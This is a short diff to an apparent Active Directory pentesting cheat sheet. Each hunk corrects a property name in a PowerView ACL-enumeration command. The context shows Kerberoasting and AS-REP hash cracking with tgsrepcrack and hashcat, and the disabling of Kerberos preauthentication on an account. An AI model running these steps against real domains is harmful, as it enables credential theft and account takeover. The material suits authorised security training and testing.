@@ -168,7 +168,7 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~
 #### Enumerate permissions
 ```
 Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
-Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, Identityreference
+Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, IdentityreferenceName
 ```
 
 #### Set SPN for the user
@@ -221,7 +221,7 @@ Hashcat -a 0 -m 18200 hash.txt rockyou.txt
 #### Enumerate permissions
 ```
 Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
-Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, Identityreference
+Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, IdentityreferenceName
 ```
 
 #### Set preauth not required
@@ -240,7 +240,7 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 #### Scan for ACL permissions
 ```
 Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
-Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, Identityreference
+Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, IdentityreferenceName
 ```
 - Check every owned user in bloodhoud
 
